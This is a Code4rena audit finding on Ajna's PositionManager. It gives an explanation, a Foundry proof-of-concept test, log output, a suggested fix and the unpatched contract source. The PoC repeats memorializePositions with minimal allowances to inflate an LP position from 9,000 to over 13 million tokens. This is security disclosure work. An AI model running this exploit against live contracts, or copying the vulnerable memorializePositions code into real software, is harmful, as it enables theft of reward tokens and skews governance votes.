{
  "Title": "[H-07] User can exponentially increase the value of their position through the `memorializePositions` function",
  "Content": "\nThe [PositionManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42) allows a lender to mint an NFT that will be representative of their lp positions. This is done by [minting](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L227) an NFT and then invoking the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) which will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on the [entirety](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L188) of the lender's lp balance for a given index bucket within the pool, the [Pool contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L74) will update the lender's balance based on the [minimum value](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#LL244C70-L244C70) between the allowed amount and the lender's balance. This means that, if a user specifies an allowance for the PositionManager contract by calling the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) that is less than their total balance for a respective position before invoking the memorializePositions function, their position's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increase by the entirety of their balance while their position that is tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool's state is 0. The lender can then [stake](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L207) this exponentially overvalued position through the [RewardsManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L35) allowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool's quote tokens through its Redeemable Reserve and, additionally, over-value the user's influence on the protocol's proposal funding because a user's votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.\n\n### Proof of Concept\n\nThe described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) and then invokes the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170). The result of this is that the user's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increment by the position's balance while the lp balance tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position.    Please see the following test case for a POC simulating the effect of this described vulnerability on a user's position:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.14;\n\nimport \"forge-std/console.sol\";\n\nimport {Base64} from \"@base64-sol/base64.sol\";\n\nimport \"tests/forge/unit/PositionManager.t.sol\";\n\n/**\n *  @title  Proof of Concept\n *  @notice Simulates the effect of the described vulnerability where a user\n *          can exponentially increase the value of their position by:\n *          1- only approving the `PositionManager` for a min amount of their position\n *          2- invoking 'memorializePositions' on their position's respective NFT\n *          3- repeating these steps until their respective position's Pool lp balance is 0\n *  @dev    This test case can be implemented and run from the ajna-core/tests/forge directory\n */\ncontract POC is PositionManagerERC20PoolHelperContract {\n    function testMemorializePositionsWithMinApproval() external {\n        uint256 intialLPBalance;\n        uint256 finalLPBalance;\n\n        address testsAddress = makeAddr(\"testsAddress\");\n        uint256 mintAmount = 10000 * 1e18;\n\n        _mintQuoteAndApproveManagerTokens(testsAddress, mintAmount);\n\n        // Call pool contract directly to add quote tokens\n        uint256[] memory indexes = new uint256[](3);\n        indexes[0] = 2550;\n        indexes[1] = 2551;\n        indexes[2] = 2552;\n\n        _addInitialLiquidity({\n            from: testsAddress,\n            amount: 3_000 * 1e18,\n            index: indexes[0]\n        });\n        _addInitialLiquidity({\n            from: testsAddress,\n            amount: 3_000 * 1e18,\n            index: indexes[1]\n        });\n        _addInitialLiquidity({\n            from: testsAddress,\n            amount: 3_000 * 1e18,\n            index: indexes[2]\n        });\n\n        // Mint an NFT to later memorialize existing positions into.\n        uint256 tokenId = _mintNFT(testsAddress, testsAddress, address(_pool));\n\n        // Pool lp balances before.\n        (uint256 poolLPBalanceIndex1, ) = _pool.lenderInfo(\n            indexes[0],\n            testsAddress\n        );\n        (uint256 poolLPBalanceIndex2, ) = _pool.lenderInfo(\n            indexes[1],\n            testsAddress\n        );\n        (uint256 poolLPBalanceIndex3, ) = _pool.lenderInfo(\n            indexes[2],\n            testsAddress\n        );\n\n        console.log(\"\\n Pool lp balances before:\");\n        console.log(\"bucket %s: %s\", indexes[0], poolLPBalanceIndex1);\n        console.log(\"bucket %s: %s\", indexes[1], poolLPBalanceIndex2);\n        console.log(\"bucket %s: %s\", indexes[2], poolLPBalanceIndex3);\n\n        intialLPBalance =\n            poolLPBalanceIndex1 +\n            poolLPBalanceIndex2 +\n            poolLPBalanceIndex3;\n\n        // PositionManager lp balances before.\n        (uint256 managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[0]\n        );\n        (uint256 managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[1]\n        );\n        (uint256 managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[2]\n        );\n\n        console.log(\"\\n PositionManger lp balances before:\");\n        console.log(\"bucket %s: %s\", indexes[0], managerLPBalanceIndex1);\n        console.log(\"bucket %s: %s\", indexes[1], managerLPBalanceIndex1);\n        console.log(\"bucket %s: %s\", indexes[2], managerLPBalanceIndex1);\n\n        console.log(\n            \"\\n <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->\"\n        );\n\n        // Approve the PositionManager for only 1 token in each bucket.\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 1 * 1e18;\n        amounts[1] = 1 * 1e18;\n        amounts[2] = 1 * 1e18;\n\n        // Continuosly invoke memorializePositions with the min allowance\n        // until Pool lp balance is 0.\n        while (\n            poolLPBalanceIndex1 != 0 &&\n            poolLPBalanceIndex2 != 0 &&\n            poolLPBalanceIndex3 != 0\n        ) {\n            // Increase manager allowance.\n            _pool.increaseLPAllowance(\n                address(_positionManager),\n                indexes,\n                amounts\n            );\n\n            // Memorialize quote tokens into minted NFT.\n            IPositionManagerOwnerActions.MemorializePositionsParams\n                memory memorializeParams = IPositionManagerOwnerActions\n                    .MemorializePositionsParams(tokenId, indexes);\n            _positionManager.memorializePositions(memorializeParams);\n\n            // Get new Pool lp balances.\n            (poolLPBalanceIndex1, ) = _pool.lenderInfo(\n                indexes[0],\n                testsAddress\n            );\n            (poolLPBalanceIndex2, ) = _pool.lenderInfo(\n                indexes[1],\n                testsAddress\n            );\n            (poolLPBalanceIndex3, ) = _pool.lenderInfo(\n                indexes[2],\n                testsAddress\n            );\n        }\n\n        // Pool lp balances after.\n        console.log(\"\\n Pool lp balances after:\");\n        console.log(\"bucket %s: %s\", indexes[0], poolLPBalanceIndex1);\n        console.log(\"bucket %s: %s\", indexes[1], poolLPBalanceIndex2);\n        console.log(\"bucket %s: %s\", indexes[2], poolLPBalanceIndex3);\n\n        // PositionManager lp balances after.\n        (managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[0]\n        );\n        (managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[1]\n        );\n        (managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(\n            tokenId,\n            indexes[2]\n        );\n\n        console.log(\"\\n PositionManger lp balances after:\");\n        console.log(\"bucket %s: %s\", indexes[0], managerLPBalanceIndex1);\n        console.log(\"bucket %s: %s\", indexes[1], managerLPBalanceIndex1);\n        console.log(\"bucket %s: %s \\n\", indexes[2], managerLPBalanceIndex1);\n\n        finalLPBalance =\n            managerLPBalanceIndex1 +\n            managerLPBalanceIndex2 +\n            managerLPBalanceIndex3;\n\n        // Assert that the initial and ending balances are equal.\n        assertEq(intialLPBalance, finalLPBalance);\n    }\n}\n\n```\n\nFor reference the log outputs that display the overall change in the users position are the following:\n\n     Pool lp balances before:\n      bucket 2550: 3000000000000000000000\n      bucket 2551: 3000000000000000000000\n      bucket 2552: 3000000000000000000000\n      \n     PositionManger lp balances before:\n      bucket 2550: 0\n      bucket 2551: 0\n      bucket 2552: 0\n      \n     <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->\n      \n     Pool lp balances after:\n      bucket 2550: 0\n      bucket 2551: 0\n      bucket 2552: 0\n      \n     PositionManger lp balances after:\n      bucket 2550: 4501500000000000000000000\n      bucket 2551: 4501500000000000000000000\n      bucket 2552: 4501500000000000000000000 \n\n      Error: a == b not satisfied [uint]\n        Expected: 13504500000000000000000000\n          Actual: 9000000000000000000000\n\nThe test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user's position has increased in value from 9,000 tokens to 13,504,500 tokens.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nIt is recommended to implement a check within the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) that will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implemented [here](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L189):\n\n```solidity\n    function memorializePositions(\n        MemorializePositionsParams calldata params_\n    ) external override {\n        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];\n\n        IPool   pool  = IPool(poolKey[params_.tokenId]);\n        address owner = ownerOf(params_.tokenId);\n\n        uint256 indexesLength = params_.indexes.length;\n        uint256 index;\n\n        for (uint256 i = 0; i < indexesLength; ) {\n            index = params_.indexes[i];\n\n            // record bucket index at which a position has added liquidity\n            // slither-disable-next-line unused-return\n            positionIndex.add(index);\n\n            (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);\n\n            // check that specified allowance is at least equal to the lp balance\n            uint256 allowance = pool.lpAllowance(index, address(this), owner);\n\n            if(allowance < lpBalance) revert AllowanceTooLow();\n\n            Position memory position = positions[params_.tokenId][index];\n\n            // check for previous deposits\n            if (position.depositTime != 0) {\n                // check that bucket didn't go bankrupt after prior memorialization\n                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {\n                    // if bucket did go bankrupt, zero out the LP tracked by position manager\n                    position.lps = 0;\n                }\n            }\n\n            // update token position LP\n            position.lps += lpBalance;\n            // set token's position deposit time to the original lender's deposit time\n            position.depositTime = depositTime;\n\n            // save position in storage\n            positions[params_.tokenId][index] = position;\n\n            unchecked { ++i; }\n        }\n\n        // update pool LP accounting and transfer ownership of LP to PositionManager contract\n        pool.transferLP(owner, address(this), params_.indexes);\n\n        emit MemorializePosition(owner, params_.tokenId, params_.indexes);\n    }\n```\n\n**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/256#issuecomment-1555117255)**\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-05-ajna",
  "Code": [
    {
      "filename": "ajna-core/src/PositionManager.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity 0.8.14;\n\nimport { ERC20 }           from '@openzeppelin/contracts/token/ERC20/ERC20.sol';\nimport { IERC20 }          from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport { ERC721 }          from '@openzeppelin/contracts/token/ERC721/ERC721.sol';\nimport { EnumerableSet }   from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\nimport { Multicall }       from '@openzeppelin/contracts/utils/Multicall.sol';\nimport { ReentrancyGuard } from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport { SafeERC20 }       from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\n\nimport { IPool }                        from './interfaces/pool/IPool.sol';\nimport { IPositionManager }             from './interfaces/position/IPositionManager.sol';\nimport { IPositionManagerOwnerActions } from './interfaces/position/IPositionManagerOwnerActions.sol';\nimport { IPositionManagerDerivedState } from './interfaces/position/IPositionManagerDerivedState.sol';\nimport { Position }                     from './interfaces/position/IPositionManagerState.sol';\n\nimport { ERC20PoolFactory }  from './ERC20PoolFactory.sol';\nimport { ERC721PoolFactory } from './ERC721PoolFactory.sol';\n\nimport { PermitERC721 } from './base/PermitERC721.sol';\n\nimport {\n    _lpToQuoteToken,\n    _priceAt\n}                      from './libraries/helpers/PoolHelper.sol';\nimport { tokenSymbol } from './libraries/helpers/SafeTokenNamer.sol';\n\nimport { PositionNFTSVG } from './libraries/external/PositionNFTSVG.sol';\n\n/**\n *  @title  Position Manager Contract\n *  @notice Used by Pool lenders to optionally mint `NFT` that represents their positions.\n *          `Lenders` can:\n *          - `mint` positions `NFT` token for a specific pool\n *          - `memorialize` positions for given buckets\n *          - `move liquidity` in pool\n *          - `redeem` positions for given buckets\n *          - `burn` positions `NFT`\n */\ncontract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, ReentrancyGuard {\n\n    using EnumerableSet for EnumerableSet.UintSet;\n    using SafeERC20     for ERC20;\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /// @dev Mapping of `token id => ajna pool address` for which token was minted.\n    mapping(uint256 => address) public override poolKey;\n\n    /// @dev Mapping of `token id => ajna pool address` for which token was minted.\n    mapping(uint256 => mapping(uint256 => Position)) internal positions;\n    /// @dev Mapping of `token id => nonce` value used for permit.\n    mapping(uint256 => uint96)                       internal nonces;\n    /// @dev Mapping of `token id => bucket indexes` associated with position.\n    mapping(uint256 => EnumerableSet.UintSet)        internal positionIndexes;\n\n    /// @dev Id of the next token that will be minted. Skips `0`.\n    uint176 private _nextId = 1;\n\n    /******************/\n    /*** Immutables ***/\n    /******************/\n\n    /// @dev The `ERC20` pools factory contract, used to check if address is an `Ajna` pool.\n    ERC20PoolFactory  private immutable erc20PoolFactory;\n    /// @dev The `ERC721` pools factory contract, used to check if address is an `Ajna` pool.\n    ERC721PoolFactory private immutable erc721PoolFactory;\n\n    /*************************/\n    /*** Local Var Structs ***/\n    /*************************/\n\n    /// @dev Struct used for `moveLiquidity` function local vars.\n    struct MoveLiquidityLocalVars {\n        uint256 bucketLP;         // [WAD] amount of LP in from bucket\n        uint256 bucketCollateral; // [WAD] amount of collateral in from bucket\n        uint256 bankruptcyTime;   // from bucket bankruptcy time\n        uint256 bucketDeposit;    // [WAD] from bucket deposit\n        uint256 depositTime;      // lender deposit time in from bucekt\n        uint256 maxQuote;         // [WAD] max amount that can be moved from bucket\n        uint256 lpbAmountFrom;    // [WAD] the LP redeemed from bucket\n        uint256 lpbAmountTo;      // [WAD] the LP awarded in to bucket\n    }\n\n    /*****************/\n    /*** Modifiers ***/\n    /*****************/\n\n    /**\n     *  @dev   Modifier used to check if sender can interact with token id.\n     *  @param pool_    `Ajna` pool address.\n     *  @param tokenId_ Id of positions `NFT`.\n     */\n    modifier mayInteract(address pool_, uint256 tokenId_) {\n\n        // revert if token id is not a valid / minted id\n        _requireMinted(tokenId_);\n\n        // revert if sender is not owner of or entitled to operate on token id\n        if (!_isApprovedOrOwner(msg.sender, tokenId_)) revert NoAuth();\n\n        // revert if the token id is not minted for given pool address\n        if (pool_ != poolKey[tokenId_]) revert WrongPool();\n\n        _;\n    }\n\n    /*******************/\n    /*** Constructor ***/\n    /*******************/\n\n    constructor(\n        ERC20PoolFactory erc20Factory_,\n        ERC721PoolFactory erc721Factory_\n    ) PermitERC721(\"Ajna Positions NFT-V1\", \"AJNA-V1-POS\", \"1\") {\n        erc20PoolFactory  = erc20Factory_;\n        erc721PoolFactory = erc721Factory_;\n    }\n\n    /********************************/\n    /*** Owner External Functions ***/\n    /********************************/\n\n    /**\n     *  @inheritdoc IPositionManagerOwnerActions\n     *  @dev    === Write state ===\n     *  @dev    `nonces`: remove `tokenId` nonce\n     *  @dev    `poolKey`: remove `tokenId => pool` mapping\n     *  @dev    === Revert on ===\n     *  @dev    - `mayInteract`:\n     *  @dev       token id is not a valid / minted id\n     *  @dev       sender is not owner `NoAuth()`\n     *  @dev       token id not minted for given pool `WrongPool()`\n     *  @dev    - positions token to burn has liquidity `LiquidityNotRemoved()`\n     *  @dev    === Emit events ===\n     *  @dev    - `Burn`\n     */\n    function burn(\n        BurnParams calldata params_\n    ) external override mayInteract(params_.pool, params_.tokenId) {\n        // revert if trying to burn an positions token that still has liquidity\n        if (positionIndexes[params_.tokenId].length() != 0) revert LiquidityNotRemoved();\n\n        // remove permit nonces and pool mapping for burned token\n        delete nonces[params_.tokenId];\n        delete poolKey[params_.tokenId];\n\n        _burn(params_.tokenId);\n\n        emit Burn(msg.sender, params_.tokenId);\n    }\n\n    /**\n     *  @inheritdoc IPositionManagerOwnerActions\n     *  @dev    External calls to `Pool` contract:\n     *  @dev    - `lenderInfo()`: get lender position in bucket\n     *  @dev    - `transferLP()`: transfer `LP` ownership to `PositionManager` contract\n     *  @dev    === Write state ===\n     *  @dev    `positionIndexes`: add bucket index\n     *  @dev    `positions`: update `tokenId => bucket id` position\n     *  @dev    === Revert on ===\n     *  @dev    positions token to burn has liquidity `LiquidityNotRemoved()`\n     *  @dev    === Emit events ===\n     *  @dev    - `MemorializePosition`\n     */\n    function memorializePositions(\n        MemorializePositionsParams calldata params_\n    ) external override {\n        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];\n\n        IPool   pool  = IPool(poolKey[params_.tokenId]);\n        address owner = ownerOf(params_.tokenId);\n\n        uint256 indexesLength = params_.indexes.length;\n        uint256 index;\n\n        for (uint256 i = 0; i < indexesLength; ) {\n            index = params_.indexes[i];\n\n            // record bucket index at which a position has added liquidity\n            // slither-disable-next-line unused-return\n            positionIndex.add(index);\n\n            (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);\n\n            Position memory position = positions[params_.tokenId][index];\n\n            // check for previous deposits\n            if (position.depositTime != 0) {\n                // check that bucket didn't go bankrupt after prior memorialization\n                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {\n                    // if bucket did go bankrupt, zero out the LP tracked by position manager\n                    position.lps = 0;\n                }\n            }\n\n            // update token position LP\n            position.lps += lpBalance;\n            // set token's position deposit time to the original lender's deposit time\n            position.depositTime = depositTime;\n\n            // save position in storage\n            positions[params_.tokenId][index] = position;\n\n            unchecked { ++i; }\n        }\n\n        // update pool LP accounting and transfer ownership of LP to PositionManager contract\n        pool.transferLP(owner, address(this), params_.indexes);\n\n        emit MemorializePosition(owner, params_.tokenId, params_.indexes);\n    }\n\n    /**\n     *  @inheritdoc IPositionManagerOwnerActions\n     *  @dev    === Write state ===\n     *  @dev    `poolKey`: update `tokenId => pool` mapping\n     *  @dev    === Revert on ===\n     *  @dev    provided pool not valid `NotAjnaPool()`\n     *  @dev    === Emit events ===\n     *  @dev    - `Mint`\n     */\n    function mint(\n        MintParams calldata params_\n    ) external override nonReentrant returns (uint256 tokenId_) {\n        tokenId_ = _nextId++;\n\n        // revert if the address is not a valid Ajna pool\n        if (!_isAjnaPool(params_.pool, params_.poolSubsetHash)) revert NotAjnaPool();\n\n        // record which pool the tokenId was minted in\n        poolKey[tokenId_] = params_.pool;\n\n        _mint(params_.recipient, tokenId_);\n\n        emit Mint(params_.recipient, params_.pool, tokenId_);\n    }\n\n    /**\n     *  @inheritdoc IPositionManagerOwnerActions\n     *  @dev    External calls to `Pool` contract:\n     *  @dev    `bucketInfo()`: get from bucket info\n     *  @dev    `moveQuoteToken()`: move liquidity between buckets\n     *  @dev    === Write state ===\n     *  @dev    `positionIndexes`: remove from bucket index\n     *  @dev    `positionIndexes`: add to bucket index\n     *  @dev    `positions`: update from bucket position\n     *  @dev    `positions`: update to bucket position\n     *  @dev    === Revert on ===\n     *  @dev    - `mayInteract`:\n     *  @dev      token id is not a valid / minted id\n     *  @dev      sender is not owner `NoAuth()`\n     *  @dev      token id not minted for given pool `WrongPool()`\n     *  @dev    - positions token to burn has liquidity `LiquidityNotRemoved()`\n     *  @dev    === Emit events ===\n     *  @dev    - `MoveLiquidity`\n     */\n    function moveLiquidity(\n        MoveLiquidityParams calldata params_\n    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {\n        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];\n\n        MoveLiquidityLocalVars memory vars;\n        vars.depositTime = fromPosition.depositTime;\n\n        // handle the case where owner attempts to move liquidity after they've already done so\n        if (vars.depositTime == 0) revert RemovePositionFailed();\n\n        // ensure bucketDeposit accounts for accrued interest\n        IPool(params_.pool).updateInterest();\n\n        // retrieve info of bucket from which liquidity is moved  \n        (\n            vars.bucketLP,\n            vars.bucketCollateral,\n            vars.bankruptcyTime,\n            vars.bucketDeposit,\n        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);\n\n        // check that bucket hasn't gone bankrupt since memorialization\n        if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();\n\n        // calculate the max amount of quote tokens that can be moved, given the tracked LP\n        vars.maxQuote = _lpToQuoteToken(\n            vars.bucketLP,\n            vars.bucketCollateral,\n            vars.bucketDeposit,\n            fromPosition.lps,\n            vars.bucketDeposit,\n            _priceAt(params_.fromIndex)\n        );\n\n        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];\n\n        // remove bucket index from which liquidity is moved from tracked positions\n        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();\n\n        // update bucket set at which a position has liquidity\n        // slither-disable-next-line unused-return\n        positionIndex.add(params_.toIndex);\n\n        // move quote tokens in pool\n        (\n            vars.lpbAmountFrom,\n            vars.lpbAmountTo,\n        ) = IPool(params_.pool).moveQuoteToken(\n            vars.maxQuote,\n            params_.fromIndex,\n            params_.toIndex,\n            params_.expiry\n        );\n\n        Position storage toPosition = positions[params_.tokenId][params_.toIndex];\n\n        // update position LP state\n        fromPosition.lps -= vars.lpbAmountFrom;\n        toPosition.lps   += vars.lpbAmountTo;\n        // update position deposit time to the from bucket deposit time\n        toPosition.depositTime = vars.depositTime;\n\n        emit MoveLiquidity(\n            ownerOf(params_.tokenId),\n            params_.tokenId,\n            params_.fromIndex,\n            params_.toIndex,\n            vars.lpbAmountFrom,\n            vars.lpbAmountTo\n        );\n    }\n\n    /**\n     *  @inheritdoc IPositionManagerOwnerActions\n     *  @dev    External calls to `Pool` contract:\n     *  @dev    `increaseLPAllowance()`: approve ownership for transfer\n     *  @dev    `transferLP()`: transfer `LP` ownership from `PositionManager` contract\n     *  @dev    === Write state ===\n     *  @dev    `positionIndexes`: remove from bucket index\n     *  @dev    `positions`: delete bucket position\n     *  @dev    === Revert on ===\n     *  @dev    - `mayInteract`:\n     *  @dev      token id is not a valid / minted id\n     *  @dev      sender is not owner `NoAuth()`\n     *  @dev      token id not minted for given pool `WrongPool()`\n     *  @dev    - position not tracked `RemoveLiquidityFailed()`\n     *  @dev    === Emit events ===\n     *  @dev    - `RedeemPosition`\n     */\n    function reedemPositions(\n        RedeemPositionsParams calldata params_\n    ) external override mayInteract(params_.pool, params_.tokenId) {\n        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];\n\n        IPool pool = IPool(params_.pool);\n\n        uint256 indexesLength = params_.indexes.length;\n        uint256[] memory lpAmounts = new uint256[](indexesLength);\n\n        uint256 index;\n\n        for (uint256 i = 0; i < indexesLength; ) {\n            index = params_.indexes[i];\n\n            Position memory position = positions[params_.tokenId][index];\n\n            if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();\n\n            // check that bucket didn't go bankrupt after memorialization\n            if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) revert BucketBankrupt();\n\n            // remove bucket index at which a position has added liquidity\n            if (!positionIndex.remove(index)) revert RemovePositionFailed();\n\n            lpAmounts[i] = position.lps;\n\n            // remove LP tracked by position manager at bucket index\n            delete positions[params_.tokenId][index];\n\n            unchecked { ++i; }\n        }\n\n        address owner = ownerOf(params_.tokenId);\n\n        // approve owner to take over the LP ownership (required for transferLP pool call)\n        pool.increaseLPAllowance(owner, params_.indexes, lpAmounts);\n        // update pool lps accounting and transfer ownership of lps from PositionManager contract\n        pool.transferLP(address(this), owner, params_.indexes);\n\n        emit RedeemPosition(owner, params_.tokenId, params_.indexes);\n    }\n\n    /**************************/\n    /*** Internal Functions ***/\n    /**************************/\n\n    /**\n     *  @notice Retrieves token's next nonce for permit.\n     *  @param  tokenId_ Address of the `Ajna` pool to retrieve accumulators of.\n     *  @return Incremented token permit nonce.\n     */\n    function _getAndIncrementNonce(\n        uint256 tokenId_\n    ) internal override returns (uint256) {\n        return uint256(nonces[tokenId_]++);\n    }\n\n    /**\n     *  @notice Checks that a provided pool address was deployed by an `Ajna` factory.\n     *  @param  pool_       Address of the `Ajna` pool.\n     *  @param  subsetHash_ Factory's subset hash pool.\n     *  @return `True` if a valid `Ajna` pool, `false` otherwise.\n     */\n    function _isAjnaPool(\n        address pool_,\n        bytes32 subsetHash_\n    ) internal view returns (bool) {\n        address collateralAddress = IPool(pool_).collateralAddress();\n        address quoteAddress      = IPool(pool_).quoteTokenAddress();\n\n        address erc20DeployedPoolAddress  = erc20PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);\n        address erc721DeployedPoolAddress = erc721PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);\n\n        return (pool_ == erc20DeployedPoolAddress || pool_ == erc721DeployedPoolAddress);\n    }\n\n    /**\n     *  @notice Checks that a bucket index associated with a given `NFT` didn't go bankrupt after memorialization.\n     *  @param  pool_        The address of the pool of memorialized position.\n     *  @param  index_       The bucket index to check deposit time for.\n     *  @param  depositTime_ The recorded deposit time of the position.\n     *  @return `True` if the bucket went bankrupt after that position memorialzied their `LP`.\n     */\n    function _bucketBankruptAfterDeposit(\n        IPool pool_,\n        uint256 index_,\n        uint256 depositTime_\n    ) internal view returns (bool) {\n        (, , uint256 bankruptcyTime, , ) = pool_.bucketInfo(index_);\n        return depositTime_ <= bankruptcyTime;\n    }\n\n    /**********************/\n    /*** View Functions ***/\n    /**********************/\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function getLP(\n        uint256 tokenId_,\n        uint256 index_\n    ) external override view returns (uint256) {\n        Position memory position = positions[tokenId_][index_];\n        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, position.depositTime) ? 0 : position.lps;\n    }\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function getPositionIndexes(\n        uint256 tokenId_\n    ) external view override returns (uint256[] memory) {\n        return positionIndexes[tokenId_].values();\n    }\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function getPositionIndexesFiltered(\n        uint256 tokenId_\n    ) external view override returns (uint256[] memory filteredIndexes_) {\n        uint256[] memory indexes = positionIndexes[tokenId_].values();\n        uint256 indexesLength = indexes.length;\n\n        // filter out bankrupt buckets\n        filteredIndexes_ = new uint256[](indexesLength);\n        uint256 filteredIndexesLength = 0;\n        IPool pool = IPool(poolKey[tokenId_]);\n        for (uint256 i = 0; i < indexesLength; ) {\n            if (!_bucketBankruptAfterDeposit(pool, indexes[i], positions[tokenId_][indexes[i]].depositTime)) {\n                filteredIndexes_[filteredIndexesLength++] = indexes[i];\n            }\n            unchecked { ++i; }\n        }\n\n        // resize array\n        assembly { mstore(filteredIndexes_, filteredIndexesLength) }\n    }\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function getPositionInfo(\n        uint256 tokenId_,\n        uint256 index_\n    ) external view override returns (uint256, uint256) {\n        return (\n            positions[tokenId_][index_].lps,\n            positions[tokenId_][index_].depositTime\n        );\n    }\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function isPositionBucketBankrupt(\n        uint256 tokenId_,\n        uint256 index_\n    ) external view override returns (bool) {\n        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, positions[tokenId_][index_].depositTime);\n    }\n\n    /// @inheritdoc IPositionManagerDerivedState\n    function isIndexInPosition(\n        uint256 tokenId_,\n        uint256 index_\n    ) external override view returns (bool) {\n        return positionIndexes[tokenId_].contains(index_);\n    